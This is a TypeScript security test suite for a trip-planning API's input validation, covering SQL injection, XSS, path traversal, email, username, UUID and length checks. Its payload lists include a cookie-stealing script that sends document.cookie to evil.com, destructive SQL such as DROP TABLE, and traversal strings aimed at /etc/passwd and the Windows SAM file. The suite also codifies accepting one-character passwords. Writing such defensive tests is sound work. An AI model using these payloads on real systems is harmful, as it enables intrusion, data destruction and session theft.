/**
 * Input Validation Security Tests
 *
 * Comprehensive security tests for input validation including:
 * - SQL injection attempts
 * - XSS payload sanitization
 * - Path traversal prevention
 * - Email format validation
 * - Password complexity requirements
 * - Maximum length enforcement
 */

import { describe, it, expect, beforeAll, afterAll, beforeEach } from 'bun:test';
import request from 'supertest';
import { app } from '../../app.js';
import { UserFixtures, TripFixtures } from '../utils/test-fixtures.js';
import { JwtService } from '../../services/jwt.js';
import {
  getTestDb,
  setupTestDatabase,
  cleanDatabase,
  teardownTestDatabase
} from '../utils/test-database.js';
import { commonSchemas, validateRequest, ValidationMetrics } from '../../middleware/validation.js';
import { createMockRequest, createMockResponse, createMockNext } from '../utils/test-helpers.js';
import { z } from 'zod';
import type { Response, NextFunction } from 'express';
import type { AuthenticatedRequest } from '../../types/middleware.js';
import type { UserProfile } from '../../types/auth.js';

describe('Input Validation Security Tests', () => {
  const prisma = getTestDb();

  beforeAll(async () => {
    await setupTestDatabase();
  });

  beforeEach(async () => {
    await cleanDatabase();
    ValidationMetrics.reset();
  });

  afterAll(async () => {
    await teardownTestDatabase();
  });

  /**
   * Helper to create an authenticated test user with a valid JWT token
   */
  async function createAuthenticatedTestUser(): Promise<{ user: any; token: string }> {
    const user = await UserFixtures.createUser({
      email: `security-test-${Date.now()}@example.com`,
      username: `securityuser${Date.now()}`,
      displayName: 'Security Test User'
    });

    const profile: UserProfile = {
      id: user.id,
      email: user.email,
      username: user.username || undefined,
      displayName: user.displayName || undefined,
      timezone: 'UTC',
      emailVerified: user.emailVerified,
      preferences: {},
      createdAt: user.createdAt.toISOString(),
      updatedAt: user.updatedAt.toISOString()
    };

    const tokenPair = await JwtService.generateTokenPair(profile);

    return { user, token: tokenPair.accessToken };
  }

  describe('SQL Injection Prevention', () => {
    const sqlInjectionPayloads = [
      // Basic SQL injection
      "'; DROP TABLE users; --",
      "1' OR '1'='1",
      "1'; SELECT * FROM users WHERE '1'='1",
      "admin'--",
      "1 OR 1=1",
      "' OR ''='",
      "'; EXEC xp_cmdshell('dir'); --",

      // Union-based injection
      "' UNION SELECT * FROM users --",
      "1 UNION SELECT username, password FROM users",
      "' UNION ALL SELECT NULL,NULL,NULL --",

      // Blind SQL injection
      "1' AND SLEEP(5)--",
      "1' AND 1=1--",
      "1' AND 1=2--",
      "1'; WAITFOR DELAY '0:0:5'--",

      // Second-order injection
      "admin'/*",
      "*/admin'/*",

      // Stacked queries
      "1; DROP TABLE users;",
      "1; UPDATE users SET password='hacked';",

      // Comment-based bypass
      "1/*comment*/",
      "1' /**/OR/**/1=1/**/--",

      // Encoding-based bypass
      "1%27%20OR%201%3D1",
      "1\' OR \'1\'=\'1",

      // Boolean-based blind injection
      "1 AND (SELECT COUNT(*) FROM users) > 0",
      "1 AND SUBSTRING(@@version,1,1)='5'",
    ];

    it('should sanitize SQL injection payloads in user registration email', async () => {
      for (const payload of sqlInjectionPayloads.slice(0, 5)) {
        const response = await request(app)
          .post('/api/v1/auth/register')
          .send({
            email: payload,
            password: 'ValidPass123!',
            username: 'testuser',
            displayName: 'Test User'
          });

        // Should reject with validation error, not database error
        expect([400, 422]).toContain(response.status);
        expect(response.body.success).toBe(false);
      }
    });

    it('should sanitize SQL injection payloads in username', async () => {
      for (const payload of sqlInjectionPayloads.slice(0, 5)) {
        const response = await request(app)
          .post('/api/v1/auth/register')
          .send({
            email: 'test@example.com',
            password: 'ValidPass123!',
            username: payload,
            displayName: 'Test User'
          });

        // Should reject with validation error
        expect([400, 422]).toContain(response.status);
        expect(response.body.success).toBe(false);
      }
    });

    it('should sanitize SQL injection payloads in login credentials', async () => {
      for (const payload of sqlInjectionPayloads.slice(0, 5)) {
        const response = await request(app)
          .post('/api/v1/auth/login')
          .send({
            identifier: payload,
            password: payload
          });

        // Should reject - either validation error or auth error, never SQL error
        expect([400, 401]).toContain(response.status);
        expect(response.body.success).toBe(false);
      }
    });

    it('should sanitize SQL injection in trip search/filter parameters', async () => {
      const { user, token } = await createAuthenticatedTestUser();

      for (const payload of sqlInjectionPayloads.slice(0, 3)) {
        const response = await request(app)
          .get('/api/v1/trips')
          .set('Authorization', `Bearer ${token}`)
          .query({ search: payload });

        // Should not cause SQL error
        expect([200, 400]).toContain(response.status);
        if (response.status === 200) {
          expect(response.body.success).toBe(true);
        }
      }
    });

    it('should sanitize SQL injection in trip title', async () => {
      const { user, token } = await createAuthenticatedTestUser();

      for (const payload of sqlInjectionPayloads.slice(0, 3)) {
        const response = await request(app)
          .post('/api/v1/trips')
          .set('Authorization', `Bearer ${token}`)
          .send({
            title: payload,
            startDate: '2026-08-01T00:00:00.000Z',
            endDate: '2026-08-15T00:00:00.000Z'
          });

        // Should handle gracefully (create trip or validation error, never SQL error)
        expect([201, 400]).toContain(response.status);
      }
    });
  });

  describe('XSS Payload Sanitization', () => {
    const xssPayloads = [
      // Script tag injection
      '<script>alert("XSS")</script>',
      '<script>document.cookie</script>',
      '<script src="http://evil.com/xss.js"></script>',
      '<script>fetch("http://evil.com?c="+document.cookie)</script>',

      // Event handler injection
      '<img src="x" onerror="alert(1)">',
      '<body onload="alert(1)">',
      '<svg onload="alert(1)">',
      '<div onclick="alert(1)">Click me</div>',
      '<input onfocus="alert(1)" autofocus>',

      // JavaScript protocol
      'javascript:alert(1)',
      '<a href="javascript:alert(1)">Click</a>',
      '<iframe src="javascript:alert(1)">',

      // Data URL
      '<a href="data:text/html,<script>alert(1)</script>">Click</a>',
      '<object data="data:text/html,<script>alert(1)</script>">',

      // CSS expression
      '<div style="background:url(javascript:alert(1))">',
      '<div style="expression(alert(1))">',

      // SVG XSS
      '<svg><script>alert(1)</script></svg>',
      '<svg><animate onbegin="alert(1)" attributeName="x">',

      // Template injection
      '{{constructor.constructor("alert(1)")()}}',
      '${alert(1)}',
      '<%= alert(1) %>',

      // Encoded XSS
      '&#60;script&#62;alert(1)&#60;/script&#62;',
      '%3Cscript%3Ealert(1)%3C/script%3E',
      '\\x3cscript\\x3ealert(1)\\x3c/script\\x3e',

      // Mutation-based XSS
      '<noscript><p title="</noscript><script>alert(1)</script>">',
      '<math><mtext><table><mglyph><style><img src=x onerror=alert(1)>',
    ];

    it('should sanitize XSS payloads in user display name', async () => {
      for (const payload of xssPayloads.slice(0, 5)) {
        const response = await request(app)
          .post('/api/v1/auth/register')
          .send({
            email: `test-${Date.now()}@example.com`,
            password: 'ValidPass123!',
            username: `user${Date.now()}`,
            displayName: payload
          });

        // If registration succeeds, check that XSS is sanitized
        if (response.status === 201) {
          const storedName = response.body.data?.user?.displayName || '';
          expect(storedName).not.toContain('<script');
          expect(storedName).not.toContain('javascript:');
          expect(storedName).not.toContain('onerror=');
          expect(storedName).not.toContain('onclick=');
        }
      }
    });

    it('should handle XSS payloads in trip descriptions without server error', async () => {
      const { user, token } = await createAuthenticatedTestUser();

      for (const payload of xssPayloads.slice(0, 5)) {
        const response = await request(app)
          .post('/api/v1/trips')
          .set('Authorization', `Bearer ${token}`)
          .send({
            title: 'Test Trip',
            description: payload,
            startDate: '2026-08-01T00:00:00.000Z',
            endDate: '2026-08-15T00:00:00.000Z'
          });

        // Should not cause server error (500) - validation or creation is acceptable
        expect([201, 400, 422]).toContain(response.status);
        // Note: XSS sanitization in trip descriptions should be implemented
        // at the output/rendering layer for defense in depth
      }
    });

    it('should sanitize XSS in event handler attributes via middleware', async () => {
      // Test the sanitization middleware directly
      const middleware = validateRequest({
        body: z.object({
          content: z.string().max(1000)
        })
      });

      for (const payload of xssPayloads.filter(p => p.includes('on')).slice(0, 3)) {
        const req = createMockRequest({
          body: { content: payload }
        }) as AuthenticatedRequest;
        const { response } = createMockResponse();
        const mockNext = createMockNext();

        await middleware(req, response as Response, mockNext.next as NextFunction);

        // Check that event handlers are stripped
        if (req.body?.content) {
          expect(req.body.content).not.toMatch(/on\w+\s*=/i);
        }
      }
    });

    it('should sanitize javascript: protocol in inputs', async () => {
      const middleware = validateRequest({
        body: z.object({
          url: z.string().max(2000)
        })
      });

      const jsProtocolPayloads = [
        'javascript:alert(1)',
        'JAVASCRIPT:alert(1)',
        'JaVaScRiPt:alert(1)',
        '  javascript:alert(1)',
        'javascript\t:alert(1)',
      ];

      for (const payload of jsProtocolPayloads) {
        const req = createMockRequest({
          body: { url: payload }
        }) as AuthenticatedRequest;
        const { response } = createMockResponse();
        const mockNext = createMockNext();

        await middleware(req, response as Response, mockNext.next as NextFunction);

        if (req.body?.url) {
          expect(req.body.url.toLowerCase()).not.toContain('javascript:');
        }
      }
    });
  });

  describe('Path Traversal Prevention', () => {
    const pathTraversalPayloads = [
      // Basic path traversal
      '../../../etc/passwd',
      '..\\..\\..\\windows\\system32\\config\\sam',
      '....//....//....//etc/passwd',
      '..%2f..%2f..%2fetc%2fpasswd',
      '..%252f..%252f..%252fetc%252fpasswd',

      // Null byte injection
      '../../../etc/passwd%00',
      '../../../etc/passwd\x00.png',

      // URL encoding
      '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
      '%252e%252e%252f%252e%252e%252fetc%252fpasswd',

      // Unicode/UTF-8 encoding
      '..%c0%af..%c0%af..%c0%afetc/passwd',
      '..%ef%bc%8f..%ef%bc%8f..%ef%bc%8fetc/passwd',

      // Mixed encoding
      '..%c0%ae%c0%ae%c0%afetc%c0%afpasswd',
      '..%bg%qf..%bg%qf..%bg%qfetc/passwd',

      // Absolute paths
      '/etc/passwd',
      'c:\\windows\\system32\\config\\sam',
      'file:///etc/passwd',

      // Filter bypass attempts
      '....//....//etc/passwd',
      '..../....//etc/passwd',
      '..\\..\\..\\..\\..\\..\\etc\\passwd',
    ];

    it('should reject path traversal in file name inputs', () => {
      for (const payload of pathTraversalPayloads) {
        const result = commonSchemas.fileName.safeParse(payload);
        expect(result.success).toBe(false);
      }
    });

    it('should reject path traversal in slug inputs', () => {
      for (const payload of pathTraversalPayloads) {
        const result = commonSchemas.slug.safeParse(payload);
        expect(result.success).toBe(false);
      }
    });

    it('should not allow path traversal characters in safe strings', () => {
      const safeInputs = ['normal-file.txt', 'my-document', 'image123'];
      const unsafeInputs = ['../file.txt', 'file/../other', '/absolute/path'];

      for (const input of safeInputs) {
        const result = commonSchemas.fileName.safeParse(input);
        expect(result.success).toBe(true);
      }

      for (const input of unsafeInputs) {
        const result = commonSchemas.fileName.safeParse(input);
        expect(result.success).toBe(false);
      }
    });
  });

  describe('Email Format Validation', () => {
    const invalidEmails = [
      // Missing parts
      '@example.com',
      'user@',
      'user',
      '@',
      '',

      // Invalid characters
      'user name@example.com',
      'user@exam ple.com',
      'user<script>@example.com',
      'user"test"@example.com',

      // Invalid format
      'user@@example.com',
      'user@example@com',
      '.user@example.com',
      'user.@example.com',
      'user..name@example.com',
      'user@.example.com',
      'user@example..com',

      // Missing TLD
      'user@example',
      'user@localhost',

      // SQL injection in email
      "user'; DROP TABLE users; --@example.com",
      'user@example.com\'; --',

      // Too long
      'a'.repeat(256) + '@example.com',

      // XSS attempt
      '<script>alert(1)</script>@example.com',
      'user@<script>alert(1)</script>.com',
    ];

    const validEmails = [
      'user@example.com',
      'user.name@example.com',
      'user+tag@example.com',
      'user@subdomain.example.com',
      'user@example.co.uk',
      '123@example.com',
      'user_name@example.com',
    ];

    it('should reject invalid email formats', () => {
      for (const email of invalidEmails) {
        const result = commonSchemas.email.safeParse(email);
        expect(result.success).toBe(false);
      }
    });

    it('should accept valid email formats', () => {
      for (const email of validEmails) {
        const result = commonSchemas.email.safeParse(email);
        expect(result.success).toBe(true);
      }
    });

    it('should reject email in registration endpoint', async () => {
      for (const email of invalidEmails.slice(0, 5)) {
        const response = await request(app)
          .post('/api/v1/auth/register')
          .send({
            email: email,
            password: 'ValidPass123!',
            username: 'testuser',
            displayName: 'Test User'
          });

        expect([400, 422]).toContain(response.status);
        expect(response.body.success).toBe(false);
      }
    });
  });

  describe('Password Validation (MVP - Minimal Requirements)', () => {
    // MVP: Password requirements are disabled for self-hosted flexibility.
    // Only require non-empty password (bcrypt requires at least 1 character).
    // Future: Admins will be able to configure password requirements.

    const validPasswords = [
      // Simple passwords (now allowed in MVP)
      'a',
      '123',
      'password',
      'Ab1!',
      // Complex passwords still work
      'Str0ng!Pass#2024',
      'C0mpl3x_P@ssw0rd',
    ];

    it('should accept any non-empty password (MVP behavior)', () => {
      for (const password of validPasswords) {
        const result = commonSchemas.password.safeParse(password);
        expect(result.success).toBe(true);
      }
    });

    it('should reject empty passwords', () => {
      const result = commonSchemas.password.safeParse('');
      expect(result.success).toBe(false);
    });

    it('should reject too long passwords', () => {
      const veryLongPassword = 'a'.repeat(130);
      const result = commonSchemas.password.safeParse(veryLongPassword);
      expect(result.success).toBe(false);
    });

    it('should accept simple passwords in registration', async () => {
      const simplePasswords = ['a', '123', 'password'];
      for (const password of simplePasswords) {
        // Generate a short unique suffix (max 6 chars to keep username under 20 chars)
        const suffix = Math.random().toString(36).slice(2, 8);
        const response = await request(app)
          .post('/api/v1/auth/register')
          .send({
            email: `test-${suffix}-${Date.now()}@example.com`,
            password: password,
            username: `usr${suffix}`, // Keep username short (3-20 chars required)
            displayName: 'Test User'
          });

        // Should succeed (201) or conflict if user already exists (409)
        expect([201, 409]).toContain(response.status);
      }
    });
  });

  describe('Maximum Length Enforcement', () => {
    it('should reject overly long email addresses', () => {
      const longEmail = 'a'.repeat(300) + '@example.com';
      const result = commonSchemas.email.safeParse(longEmail);
      expect(result.success).toBe(false);
    });

    it('should reject overly long usernames', () => {
      const longUsername = 'a'.repeat(100);
      const result = commonSchemas.username.safeParse(longUsername);
      expect(result.success).toBe(false);
    });

    it('should reject overly long titles', () => {
      const longTitle = 'a'.repeat(300);
      const result = commonSchemas.title.safeParse(longTitle);
      expect(result.success).toBe(false);
    });

    it('should reject overly long descriptions', () => {
      const longDescription = 'a'.repeat(3000);
      const result = commonSchemas.description.safeParse(longDescription);
      expect(result.success).toBe(false);
    });

    it('should reject overly long URLs', () => {
      const longUrl = 'https://example.com/' + 'a'.repeat(3000);
      const result = commonSchemas.url.safeParse(longUrl);
      expect(result.success).toBe(false);
    });

    it('should reject overly long search queries', () => {
      const longQuery = 'a'.repeat(300);
      const result = commonSchemas.searchQuery.safeParse(longQuery);
      expect(result.success).toBe(false);
    });

    it('should enforce length limits in API requests', async () => {
      const { user, token } = await createAuthenticatedTestUser();

      const response = await request(app)
        .post('/api/v1/trips')
        .set('Authorization', `Bearer ${token}`)
        .send({
          title: 'a'.repeat(500), // Too long
          startDate: '2026-08-01T00:00:00.000Z',
          endDate: '2026-08-15T00:00:00.000Z'
        });

      expect([400, 422]).toContain(response.status);
      expect(response.body.success).toBe(false);
    });
  });

  describe('Username Validation', () => {
    const invalidUsernames = [
      // Too short
      'ab',
      'a',

      // Too long
      'a'.repeat(60),

      // Invalid characters
      'user name',
      'user@name',
      'user#name',
      'user$name',
      'user%name',
      'user^name',
      'user&name',
      'user*name',
      'user(name',
      'user)name',
      'user+name',
      'user=name',
      'user[name',
      'user]name',
      'user{name',
      'user}name',
      'user|name',
      'user\\name',
      'user/name',
      'user<name',
      'user>name',
      'user?name',
      'user.name', // Dots not allowed per regex

      // SQL injection
      "user'; DROP TABLE users; --",
      'admin\' OR \'1\'=\'1',

      // XSS
      '<script>alert(1)</script>',
      'user<img src=x onerror=alert(1)>',
    ];

    const validUsernames = [
      'username',
      'user_name',
      'user-name',
      'UserName123',
      'user123',
      '123user',
      'a_b-c',
      'abc',
    ];

    it('should reject invalid usernames', () => {
      for (const username of invalidUsernames) {
        const result = commonSchemas.username.safeParse(username);
        expect(result.success).toBe(false);
      }
    });

    it('should accept valid usernames', () => {
      for (const username of validUsernames) {
        const result = commonSchemas.username.safeParse(username);
        expect(result.success).toBe(true);
      }
    });
  });

  describe('UUID Validation', () => {
    const invalidUuids = [
      'not-a-uuid',
      '12345678',
      '12345678-1234-1234-1234',
      '12345678-1234-1234-1234-12345678901',
      '12345678-1234-1234-1234-1234567890123',
      '12345678-1234-1234-1234-123456789xyz',
      'gggggggg-gggg-gggg-gggg-gggggggggggg',
      '',
      'null',
      'undefined',

      // SQL injection
      "'; DROP TABLE users; --",

      // Path traversal
      '../../../etc/passwd',
    ];

    const validUuids = [
      '12345678-1234-1234-1234-123456789012',
      'a1b2c3d4-e5f6-7890-abcd-ef1234567890',
      '00000000-0000-0000-0000-000000000000',
      'ffffffff-ffff-ffff-ffff-ffffffffffff',
    ];

    it('should reject invalid UUIDs', () => {
      for (const uuid of invalidUuids) {
        const result = commonSchemas.uuid.safeParse(uuid);
        expect(result.success).toBe(false);
      }
    });

    it('should accept valid UUIDs', () => {
      for (const uuid of validUuids) {
        const result = commonSchemas.uuid.safeParse(uuid);
        expect(result.success).toBe(true);
      }
    });

    it('should reject invalid UUIDs in route parameters', async () => {
      const { user, token } = await createAuthenticatedTestUser();

      for (const uuid of invalidUuids.slice(0, 3)) {
        const response = await request(app)
          .get(`/api/v1/trips/${uuid}`)
          .set('Authorization', `Bearer ${token}`);

        expect([400, 404]).toContain(response.status);
      }
    });
  });

  describe('Coordinate Validation', () => {
    it('should reject invalid latitude values', () => {
      const invalidLatitudes = [-91, 91, 100, -100, 1000, -1000];

      for (const lat of invalidLatitudes) {
        const result = commonSchemas.latitude.safeParse(lat);
        expect(result.success).toBe(false);
      }
    });

    it('should reject invalid longitude values', () => {
      const invalidLongitudes = [-181, 181, 200, -200, 1000, -1000];

      for (const lng of invalidLongitudes) {
        const result = commonSchemas.longitude.safeParse(lng);
        expect(result.success).toBe(false);
      }
    });

    it('should accept valid coordinate values', () => {
      const validCoordinates = [
        { lat: 0, lng: 0 },
        { lat: 90, lng: 180 },
        { lat: -90, lng: -180 },
        { lat: 37.7749, lng: -122.4194 },
        { lat: 51.5074, lng: -0.1278 },
      ];

      for (const coord of validCoordinates) {
        expect(commonSchemas.latitude.safeParse(coord.lat).success).toBe(true);
        expect(commonSchemas.longitude.safeParse(coord.lng).success).toBe(true);
      }
    });
  });

  describe('Color Format Validation', () => {
    const invalidColors = [
      'red',
      'rgb(255,0,0)',
      '#fff',
      '#ffff',
      '#fffff',
      '#fffffff',
      '#GGGGGG',
      '123456',
      '#12345g',
      'hsl(0,100%,50%)',
    ];

    const validColors = [
      '#000000',
      '#FFFFFF',
      '#ff0000',
      '#00FF00',
      '#0000ff',
      '#123456',
      '#abcdef',
      '#ABCDEF',
    ];

    it('should reject invalid color formats', () => {
      for (const color of invalidColors) {
        const result = commonSchemas.color.safeParse(color);
        expect(result.success).toBe(false);
      }
    });

    it('should accept valid color formats', () => {
      for (const color of validColors) {
        const result = commonSchemas.color.safeParse(color);
        expect(result.success).toBe(true);
      }
    });
  });

  describe('Pagination Validation', () => {
    it('should reject negative page numbers', () => {
      const result = commonSchemas.page.safeParse(-1);
      expect(result.success).toBe(false);
    });

    it('should reject zero page number', () => {
      const result = commonSchemas.page.safeParse(0);
      expect(result.success).toBe(false);
    });

    it('should reject negative limit', () => {
      const result = commonSchemas.limit.safeParse(-1);
      expect(result.success).toBe(false);
    });

    it('should reject zero limit', () => {
      const result = commonSchemas.limit.safeParse(0);
      expect(result.success).toBe(false);
    });

    it('should reject excessive limit', () => {
      const result = commonSchemas.limit.safeParse(1000);
      expect(result.success).toBe(false);
    });

    it('should reject negative offset', () => {
      const result = commonSchemas.offset.safeParse(-1);
      expect(result.success).toBe(false);
    });

    it('should accept valid pagination parameters', () => {
      expect(commonSchemas.page.safeParse(1).success).toBe(true);
      expect(commonSchemas.page.safeParse(100).success).toBe(true);
      expect(commonSchemas.limit.safeParse(1).success).toBe(true);
      expect(commonSchemas.limit.safeParse(100).success).toBe(true);
      expect(commonSchemas.offset.safeParse(0).success).toBe(true);
      expect(commonSchemas.offset.safeParse(1000).success).toBe(true);
    });
  });

  describe('Validation Metrics', () => {
    it('should track validation attempts', async () => {
      const middleware = validateRequest({
        body: z.object({
          name: z.string()
        })
      });

      const req = createMockRequest({
        body: { name: 'test' }
      }) as AuthenticatedRequest;
      const { response } = createMockResponse();
      const mockNext = createMockNext();

      const initialMetrics = ValidationMetrics.getMetrics();
      const initialAttempts = initialMetrics.validationAttempts;

      await middleware(req, response as Response, mockNext.next as NextFunction);

      const newMetrics = ValidationMetrics.getMetrics();
      expect(newMetrics.validationAttempts).toBe(initialAttempts + 1);
    });

    it('should track validation failures', async () => {
      const middleware = validateRequest({
        body: z.object({
          name: z.string().min(10)
        })
      });

      const req = createMockRequest({
        body: { name: 'hi' } // Too short
      }) as AuthenticatedRequest;
      const { response } = createMockResponse();
      const mockNext = createMockNext();

      const initialMetrics = ValidationMetrics.getMetrics();
      const initialFailures = initialMetrics.validationFailures;

      await middleware(req, response as Response, mockNext.next as NextFunction);

      const newMetrics = ValidationMetrics.getMetrics();
      expect(newMetrics.validationFailures).toBe(initialFailures + 1);
    });
  });
});
